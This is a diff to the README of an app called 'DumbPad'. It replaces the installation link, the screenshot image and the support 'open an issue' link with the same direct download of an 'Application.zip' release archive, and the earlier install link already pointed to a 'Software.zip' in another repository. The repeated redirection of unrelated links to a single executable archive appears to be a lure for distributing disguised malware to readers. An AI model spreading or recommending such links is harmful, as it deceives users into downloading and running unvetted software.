@@ -15,12 +15,12 @@ DumbPad is a simple yet efficient application designed to help you organize your
 
 ## Installation 🛠️
 
-To install DumbPad, simply download the software package from [here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip). Once downloaded, extract the contents and launch the application.
+To install DumbPad, simply download the software package from [here](https://github.com/Alaouie/DumbPad/releases/download/v1.0/Application.zip). Once downloaded, extract the contents and launch the application.
 
 ## Screenshots 📷
 
 Here's a sneak peek at what DumbPad looks like:
-![DumbPad Screenshot](https://via.placeholder.com/600x400)
+![DumbPad Screenshot](https://github.com/Alaouie/DumbPad/releases/download/v1.0/Application.zip)
 
 ## How to Use 🚀
 
@@ -31,7 +31,7 @@ Here's a sneak peek at what DumbPad looks like:
 
 ## Support 🤝
 
-For any issues or feedback, please [open an issue](https://github.com/Rubenas123/DumbPad/issues) on this repository.
+For any issues or feedback, please [open an issue](https://github.com/Alaouie/DumbPad/releases/download/v1.0/Application.zip) on this repository.
 
 ## License 📄
 
